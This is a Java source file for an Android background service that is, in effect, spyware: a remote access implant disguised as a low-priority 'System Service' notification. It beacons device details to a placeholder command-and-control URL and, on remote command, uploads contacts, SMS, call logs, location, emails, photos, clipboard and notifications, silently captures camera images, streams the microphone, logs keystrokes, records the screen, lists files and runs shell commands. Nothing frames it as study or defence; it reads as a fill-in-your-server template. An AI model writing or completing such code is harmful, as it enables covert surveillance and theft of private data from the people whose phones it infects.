package com.shadow.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import org.json.JSONObject;
import org.json.JSONArray;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class MainService extends Service {
    public static final String C2 = "https://YOUR_C2_DOMAIN/api"; // FILL: YOUR IP HERE
    private static String DEVICE_ID;
    private ScheduledExecutorService scheduler;
    private static MainService instance;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        DEVICE_ID = android.provider.Settings.Secure.getString(
                getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        startForeground(1, buildNotification());
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::heartbeat, 0, 8, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(this::pullCommands, 3, 5, TimeUnit.SECONDS);
    }

    private Notification buildNotification() {
        String channelId = "sys_svc";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(ch);
        }
        return new Notification.Builder(this, channelId)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(Notification.PRIORITY_MIN)
                .build();
    }

    private void heartbeat() {
        try {
            JSONObject body = new JSONObject();
            body.put("device_id", DEVICE_ID);
            body.put("model", android.os.Build.MODEL);
            body.put("android", android.os.Build.VERSION.RELEASE);
            body.put("lang", getResources().getConfiguration().locale.getLanguage());
            body.put("ip", NetworkUtil.getLocalIp(this));
            post(C2 + "/heartbeat", body.toString());
        } catch (Exception ignored) {}
    }

    private void pullCommands() {
        try {
            String resp = get(C2 + "/cmd?device_id=" + DEVICE_ID);
            if (resp == null || resp.isEmpty() || resp.equals("{}")) return;
            JSONObject cmd = new JSONObject(resp);
            String action = cmd.optString("action");
            switch (action) {
                case "contacts": uploadContacts(); break;
                case "call_log": uploadCallLog(); break;
                case "sms_old": uploadSms(false); break;
                case "sms_new": uploadSms(true); break;
                case "device_info": uploadDeviceInfo(); break;
                case "wifi": uploadWifi(); break;
                case "advanced": uploadAdvanced(); break;
                case "clipboard": uploadClipboard(); break;
                case "ip_info": uploadIpInfo(); break;
                case "location": uploadLocation(); break;
                case "notifications": uploadNotifications(); break;
                case "emails": uploadEmails(); break;
                case "photos": uploadPhotos(); break;
                case "camera": openCameraSilent(); break;
                case "mic": startMicStream(); break;
                case "files": listFiles(cmd.optString("path", "/sdcard")); break;
                case "shell": runShell(cmd.optString("cmd")); break;
                case "keylog_start": KeylogService.start(this); break;
                case "keylog_stop": KeylogService.stop(this); break;
                case "screen": ScreenCapture.start(this); break;
            }
        } catch (Exception ignored) {}
    }

    public static void sendKey(String text) {
        if (instance == null) return;
        try {
            JSONObject o = new JSONObject();
            o.put("device_id", DEVICE_ID);
            o.put("type", "keylog");
            o.put("data", text);
            instance.post(C2 + "/upload", o.toString());
        } catch (Exception ignored) {}
    }

    private void uploadContacts() { post(C2 + "/upload", pack("contacts", ContactReader.dump(this))); }
    private void uploadCallLog() { post(C2 + "/upload", pack("call_log", CallLogReader.dump(this))); }
    private void uploadSms(boolean onlyNew) { post(C2 + "/upload", pack(onlyNew ? "sms_new" : "sms_old", SmsReader.dump(this, onlyNew))); }
    private void uploadDeviceInfo() { post(C2 + "/upload", pack("device_info", DeviceInfo.collect(this))); }
    private void uploadWifi() { post(C2 + "/upload", pack("wifi", WifiReader.dump(this))); }
    private void uploadAdvanced() { post(C2 + "/upload", pack("advanced", AdvancedCollector.dump(this))); }
    private void uploadClipboard() { post(C2 + "/upload", pack("clipboard", ClipboardReader.read(this))); }
    private void uploadIpInfo() { post(C2 + "/upload", pack("ip_info", IpCollector.dump())); }
    private void uploadLocation() { post(C2 + "/upload", pack("location", LocationReader.current(this))); }
    private void uploadNotifications() { post(C2 + "/upload", pack("notifications", NotificationReader.dump(this))); }
    private void uploadEmails() { post(C2 + "/upload", pack("emails", EmailReader.dump(this))); }
    private void uploadPhotos() { post(C2 + "/upload", pack("photos", PhotoReader.list(this))); }
    private void openCameraSilent() { CameraSilent.capture(this, bytes -> postBinary(C2 + "/upload_bin", "camera", bytes)); }
    private void startMicStream() { MicStreamer.start(this, C2 + "/stream/mic?device_id=" + DEVICE_ID); }
    private void listFiles(String path) { post(C2 + "/upload", pack("files", FileWalker.list(path))); }
    private void runShell(String cmd) { post(C2 + "/upload", pack("shell", ShellRunner.exec(cmd))); }

    private String pack(String type, Object data) {
        try {
            JSONObject o = new JSONObject();
            o.put("device_id", DEVICE_ID);
            o.put("type", type);
            o.put("data", data);
            return o.toString();
        } catch (Exception e) { return "{}"; }
    }

    private void post(String url, String body) {
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type", "application/json");
                c.setRequestProperty("X-Device", DEVICE_ID);
                try (OutputStream os = c.getOutputStream()) { os.write(body.getBytes("UTF-8")); }
                c.getResponseCode();
                c.disconnect();
            } catch (Exception ignored) {}
        });
    }

    private void postBinary(String url, String type, byte[] data) {
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type", "application/octet-stream");
                c.setRequestProperty("X-Device", DEVICE_ID);
                c.setRequestProperty("X-Type", type);
                try (OutputStream os = c.getOutputStream()) { os.write(data); }
                c.getResponseCode();
                c.disconnect();
            } catch (Exception ignored) {}
        });
    }

    private String get(String url) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("GET");
            c.setRequestProperty("X-Device", DEVICE_ID);
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            c.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() {
        if (scheduler != null) scheduler.shutdownNow();
        super.onDestroy();
    }
                                                              }
